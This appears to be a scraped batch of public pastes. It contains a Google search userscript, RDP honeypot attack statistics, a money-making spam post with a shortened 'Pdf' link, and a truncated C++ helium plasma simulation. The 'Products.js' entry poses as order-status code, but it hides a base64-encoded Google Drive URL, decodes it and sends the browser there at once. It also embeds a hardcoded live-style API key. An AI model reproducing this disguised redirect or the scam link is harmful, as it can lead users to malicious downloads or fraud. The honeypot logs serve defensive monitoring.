id,title,username,language,date,content
JiMQLrEH,Untitled,zvit,JavaScript,Saturday 19th of April 2025 07:23:25 PM CDT,"// ==UserScript==
// @name        Google Web Parameter Search
// @namespace   ViolentMonkey Scripts
// @match       *://www.google.com/search*
// @grant       none
// @version     1.0
// @author      -
// @icon        https://www.gstatic.com/marketing-cms/assets/images/d5/dc/cfe9ce8b4425b410b49b7f2dd3f3/g.webp=s48-fcrop64=1,00000000ffffffff-rw
// @description Automatically adds udm=14 parameter to Google searches to always show web results
// ==/UserScript==

(() => {
    // Function to modify the URL
    function modifyGoogleSearchUrl() {
        // Get current URL
        const currentUrl = new URL(window.location.href);
        const searchParams = currentUrl.searchParams;

        // Get the search query
        const query = searchParams.get('q');

        // If there's no query or we're already on a udm=14 URL, do nothing
        if (!query || (searchParams.get('udm') === '14')) {
            return;
        }

        // Create new URL with the udm=14 parameter
        const newUrl = new URL('https://www.google.com/search');
        newUrl.searchParams.set('udm', '14');
        newUrl.searchParams.set('q', query);

        // Replace the current URL without reloading the page
        window.history.replaceState({}, '', newUrl.toString());

        // If the page hasn't loaded the correct results yet, reload it
        if (!document.querySelector('a[aria-current=""page""][href*=""udm=14""]')) {
            window.location.href = newUrl.toString();
        }
    }

    // Run when the page loads
    modifyGoogleSearchUrl();

    // Also run when URL changes without page reload (Google sometimes does this)
    const observer = new MutationObserver(() => {
        if (window.location.href.includes('google.com/search') && !window.location.href.includes('udm=14')) {
            modifyGoogleSearchUrl();
        }
    });

    // Observe changes to the document
    observer.observe(document, { subtree: true, childList: true });

    // Also listen for history state changes
    window.addEventListener('popstate', () => {
        modifyGoogleSearchUrl();
    });
})();
"
NECwd40P,Products.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 07:20:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99366/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8b39cLKt,2025-04-19_stats.json,rdp_snitch,JSON,Saturday 19th of April 2025 07:18:09 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 7146,
    ""80.94.95.198"": 42,
    ""91.238.181.95"": 6,
    ""211.185.207.14"": 27,
    ""198.235.24.219"": 9,
    ""143.198.113.150"": 6,
    ""80.94.95.90"": 3,
    ""62.60.188.24"": 6,
    ""71.6.134.231"": 30,
    ""47.121.132.191"": 6,
    ""205.210.31.89"": 9,
    ""167.71.156.22"": 12,
    ""50.116.45.75"": 3,
    ""198.58.100.136"": 3,
    ""221.181.44.30"": 9,
    ""71.82.170.60"": 9,
    ""134.209.56.75"": 12,
    ""192.81.131.250"": 3,
    ""147.185.132.189"": 9,
    ""194.165.16.163"": 6,
    ""146.190.79.87"": 12,
    ""45.56.121.78"": 3,
    ""88.214.25.124"": 6,
    ""147.185.132.103"": 9
  },
  ""asn"": {
    ""AS212238"": 7146,
    ""AS204428"": 45,
    ""AS49434"": 6,
    ""AS4766"": 27,
    ""AS396982"": 36,
    ""AS14061"": 42,
    ""AS215930"": 6,
    ""AS10439"": 30,
    ""AS37963"": 6,
    ""AS63949"": 12,
    ""AS9808"": 9,
    ""AS20115"": 9,
    ""AS48721"": 6,
    ""AS35042"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 7146,
    ""SS-Net"": 45,
    ""Datacenter location PAR1 France"": 6,
    ""Korea Telecom"": 27,
    ""Google LLC"": 36,
    ""DigitalOcean, LLC"": 42,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""CariNet, Inc."": 30,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 6,
    ""Akamai Technologies, Inc."": 12,
    ""China Mobile communications corporation"": 9,
    ""Charter Communications"": 9,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 7146,
    ""Unmanaged LTD"": 45,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Kornet"": 27,
    ""Palo Alto Networks, Inc"": 36,
    ""DigitalOcean, LLC"": 42,
    ""UAB Host Baltic"": 6,
    ""CariNet, Inc."": 30,
    ""Alibaba.com LLC"": 6,
    ""Linode"": 12,
    ""China Mobile"": 9,
    ""Spectrum"": 9,
    ""Flyservers S.A"": 6
  },
  ""regionName"": {
    ""North West"": 7146,
    ""Budapest"": 45,
    ""\u00cele-de-France"": 6,
    ""Sejong-si"": 27,
    ""California"": 63,
    ""New Jersey"": 18,
    ""Tehran"": 6,
    ""Nevada"": 30,
    ""Guangdong"": 15,
    ""Georgia"": 3,
    ""Texas"": 6,
    ""Wisconsin"": 9,
    ""Kaunas"": 6,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 7146,
    ""Hungary"": 45,
    ""France"": 6,
    ""South Korea"": 27,
    ""United States"": 129,
    ""Iran"": 6,
    ""China"": 15,
    ""Lithuania"": 6,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 7173,
    ""142.93.8.59"": 78,
    ""Test"": 18,
    ""xPuDxdrfP"": 3,
    ""JGvBQv"": 3,
    ""lRoZLB"": 3,
    ""Administr"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""fXdbDOBpm"": 3,
    ""nmmtFW"": 3,
    ""esYGsN"": 3,
    ""pagjywbf"": 12,
    ""beio"": 12,
    ""3rmqhzof"": 12,
    ""AuiBTRCxU"": 3,
    ""XYoOnv"": 3,
    ""akuFcj"": 3,
    ""23fkjcuf"": 12,
    ""phrcGXfgx"": 3,
    ""TqJCYV"": 3,
    ""mWsrax"": 3
  },
  ""keyboard"": {
    ""Unknown"": 7386
  },
  ""client_build"": {
    ""Unknown"": 7386
  },
  ""client_name"": {
    ""Unknown"": 7386
  },
  ""ip_type"": {
    ""hosting & proxy"": 7170,
    ""Unknown"": 99,
    ""hosting"": 108,
    ""mobile"": 9
  }
}"
9EtzE7UH,EARN $900 INSTANTLY 2025 XH,nooooooooootbr,JavaScript,Saturday 19th of April 2025 07:18:08 PM CDT," 
Pdf https://tinyurl.com/privguidee


joJMkHtkmj
"
jvUhvFmt,2025-04-19_stats.json,rdp_snitch,JSON,Saturday 19th of April 2025 07:16:10 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 4764,
    ""80.94.95.198"": 28,
    ""91.238.181.95"": 4,
    ""211.185.207.14"": 18,
    ""198.235.24.219"": 6,
    ""143.198.113.150"": 4,
    ""80.94.95.90"": 2,
    ""62.60.188.24"": 4,
    ""71.6.134.231"": 20,
    ""47.121.132.191"": 4,
    ""205.210.31.89"": 6,
    ""167.71.156.22"": 8,
    ""50.116.45.75"": 2,
    ""198.58.100.136"": 2,
    ""221.181.44.30"": 6,
    ""71.82.170.60"": 6,
    ""134.209.56.75"": 8,
    ""192.81.131.250"": 2,
    ""147.185.132.189"": 6,
    ""194.165.16.163"": 4,
    ""146.190.79.87"": 8,
    ""45.56.121.78"": 2,
    ""88.214.25.124"": 4,
    ""147.185.132.103"": 6
  },
  ""asn"": {
    ""AS212238"": 4764,
    ""AS204428"": 30,
    ""AS49434"": 4,
    ""AS4766"": 18,
    ""AS396982"": 24,
    ""AS14061"": 28,
    ""AS215930"": 4,
    ""AS10439"": 20,
    ""AS37963"": 4,
    ""AS63949"": 8,
    ""AS9808"": 6,
    ""AS20115"": 6,
    ""AS48721"": 4,
    ""AS35042"": 4
  },
  ""isp"": {
    ""Datacamp Limited"": 4764,
    ""SS-Net"": 30,
    ""Datacenter location PAR1 France"": 4,
    ""Korea Telecom"": 18,
    ""Google LLC"": 24,
    ""DigitalOcean, LLC"": 28,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""CariNet, Inc."": 20,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 4,
    ""Akamai Technologies, Inc."": 8,
    ""China Mobile communications corporation"": 6,
    ""Charter Communications"": 6,
    ""Flyservers S.A."": 4,
    ""NOC EMAIL: noc@one-host.net"": 4
  },
  ""org"": {
    ""Datacamp Limited"": 4764,
    ""Unmanaged LTD"": 30,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Kornet"": 18,
    ""Palo Alto Networks, Inc"": 24,
    ""DigitalOcean, LLC"": 28,
    ""UAB Host Baltic"": 4,
    ""CariNet, Inc."": 20,
    ""Alibaba.com LLC"": 4,
    ""Linode"": 8,
    ""China Mobile"": 6,
    ""Spectrum"": 6,
    ""Flyservers S.A"": 4
  },
  ""regionName"": {
    ""North West"": 4764,
    ""Budapest"": 30,
    ""\u00cele-de-France"": 4,
    ""Sejong-si"": 18,
    ""California"": 42,
    ""New Jersey"": 12,
    ""Tehran"": 4,
    ""Nevada"": 20,
    ""Guangdong"": 10,
    ""Georgia"": 2,
    ""Texas"": 4,
    ""Wisconsin"": 6,
    ""Kaunas"": 4,
    ""Kowloon City"": 4
  },
  ""country"": {
    ""Singapore"": 4764,
    ""Hungary"": 30,
    ""France"": 4,
    ""South Korea"": 18,
    ""United States"": 86,
    ""Iran"": 4,
    ""China"": 10,
    ""Lithuania"": 4,
    ""Hong Kong"": 4
  },
  ""account"": {
    ""hello"": 4782,
    ""142.93.8.59"": 52,
    ""Test"": 12,
    ""xPuDxdrfP"": 2,
    ""JGvBQv"": 2,
    ""lRoZLB"": 2,
    ""Administr"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""fXdbDOBpm"": 2,
    ""nmmtFW"": 2,
    ""esYGsN"": 2,
    ""pagjywbf"": 8,
    ""beio"": 8,
    ""3rmqhzof"": 8,
    ""AuiBTRCxU"": 2,
    ""XYoOnv"": 2,
    ""akuFcj"": 2,
    ""23fkjcuf"": 8,
    ""phrcGXfgx"": 2,
    ""TqJCYV"": 2,
    ""mWsrax"": 2
  },
  ""keyboard"": {
    ""Unknown"": 4924
  },
  ""client_build"": {
    ""Unknown"": 4924
  },
  ""client_name"": {
    ""Unknown"": 4924
  },
  ""ip_type"": {
    ""hosting & proxy"": 4780,
    ""Unknown"": 66,
    ""hosting"": 72,
    ""mobile"": 6
  }
}"
eQV0KV62,2025-04-19_stats.json,rdp_snitch,JSON,Saturday 19th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 2382,
    ""80.94.95.198"": 14,
    ""91.238.181.95"": 2,
    ""211.185.207.14"": 9,
    ""198.235.24.219"": 3,
    ""143.198.113.150"": 2,
    ""80.94.95.90"": 1,
    ""62.60.188.24"": 2,
    ""71.6.134.231"": 10,
    ""47.121.132.191"": 2,
    ""205.210.31.89"": 3,
    ""167.71.156.22"": 4,
    ""50.116.45.75"": 1,
    ""198.58.100.136"": 1,
    ""221.181.44.30"": 3,
    ""71.82.170.60"": 3,
    ""134.209.56.75"": 4,
    ""192.81.131.250"": 1,
    ""147.185.132.189"": 3,
    ""194.165.16.163"": 2,
    ""146.190.79.87"": 4,
    ""45.56.121.78"": 1,
    ""88.214.25.124"": 2,
    ""147.185.132.103"": 3
  },
  ""asn"": {
    ""AS212238"": 2382,
    ""AS204428"": 15,
    ""AS49434"": 2,
    ""AS4766"": 9,
    ""AS396982"": 12,
    ""AS14061"": 14,
    ""AS215930"": 2,
    ""AS10439"": 10,
    ""AS37963"": 2,
    ""AS63949"": 4,
    ""AS9808"": 3,
    ""AS20115"": 3,
    ""AS48721"": 2,
    ""AS35042"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 2382,
    ""SS-Net"": 15,
    ""Datacenter location PAR1 France"": 2,
    ""Korea Telecom"": 9,
    ""Google LLC"": 12,
    ""DigitalOcean, LLC"": 14,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""CariNet, Inc."": 10,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 2,
    ""Akamai Technologies, Inc."": 4,
    ""China Mobile communications corporation"": 3,
    ""Charter Communications"": 3,
    ""Flyservers S.A."": 2,
    ""NOC EMAIL: noc@one-host.net"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 2382,
    ""Unmanaged LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Kornet"": 9,
    ""Palo Alto Networks, Inc"": 12,
    ""DigitalOcean, LLC"": 14,
    ""UAB Host Baltic"": 2,
    ""CariNet, Inc."": 10,
    ""Alibaba.com LLC"": 2,
    ""Linode"": 4,
    ""China Mobile"": 3,
    ""Spectrum"": 3,
    ""Flyservers S.A"": 2
  },
  ""regionName"": {
    ""North West"": 2382,
    ""Budapest"": 15,
    ""\u00cele-de-France"": 2,
    ""Sejong-si"": 9,
    ""California"": 21,
    ""New Jersey"": 6,
    ""Tehran"": 2,
    ""Nevada"": 10,
    ""Guangdong"": 5,
    ""Georgia"": 1,
    ""Texas"": 2,
    ""Wisconsin"": 3,
    ""Kaunas"": 2,
    ""Kowloon City"": 2
  },
  ""country"": {
    ""Singapore"": 2382,
    ""Hungary"": 15,
    ""France"": 2,
    ""South Korea"": 9,
    ""United States"": 43,
    ""Iran"": 2,
    ""China"": 5,
    ""Lithuania"": 2,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""hello"": 2391,
    ""142.93.8.59"": 26,
    ""Test"": 6,
    ""xPuDxdrfP"": 1,
    ""JGvBQv"": 1,
    ""lRoZLB"": 1,
    ""Administr"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""fXdbDOBpm"": 1,
    ""nmmtFW"": 1,
    ""esYGsN"": 1,
    ""pagjywbf"": 4,
    ""beio"": 4,
    ""3rmqhzof"": 4,
    ""AuiBTRCxU"": 1,
    ""XYoOnv"": 1,
    ""akuFcj"": 1,
    ""23fkjcuf"": 4,
    ""phrcGXfgx"": 1,
    ""TqJCYV"": 1,
    ""mWsrax"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2462
  },
  ""client_build"": {
    ""Unknown"": 2462
  },
  ""client_name"": {
    ""Unknown"": 2462
  },
  ""ip_type"": {
    ""hosting & proxy"": 2390,
    ""Unknown"": 33,
    ""hosting"": 36,
    ""mobile"": 3
  }
}"
GLjTtSmk,tamp,phystota,C++,Saturday 19th of April 2025 07:10:13 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state
#define tau_singlet 0.0195

// simulation parameters

#define n_e 50000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 10.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 3000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-3 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 0.1 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 10000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");
    std::ofstream file16(""output_files/energy_gain.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }



    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //


    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    // double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    // double steps = static_cast<int>(time/dt);

    // std::cout << steps << ""\n"";
    // std::cout << dt << ""\n"";

    // //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    // int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

    // std::cout << ""Ne_collided:"" << Ne_collided << ""\n"";

    int print_interval = 10;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    double a_z = ((-1.0)*q * E_reduced) / m_e;
    double mass_ratio = 2.0*(m_e/M_n);
    double charge_mass_ratio = 0.5*m_e/q;
    double sqrt_charge_mass = sqrt(2*q/m_e);
    double C1 = -1.0*q*E_reduced;
    double C2 = 0.5*C1*C1/m_e;

    double total_time = 1.0E-2; // total calculation time
    double t_elapsed = 0.0;

    std::cout << C1 << ""    "" << C2 << ""\n"";


    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        // Get initial densities
        double n_ground = N_He / Volume;
        double n_excited1 = exc_1.size() / Volume;
        double n_excited2 = exc_2.size() / Volume;
 
        double energy = Emin + (i + 0.5) * bin_width;
 
        // Total collision frequency for this energy bin
        double sigma_total = 
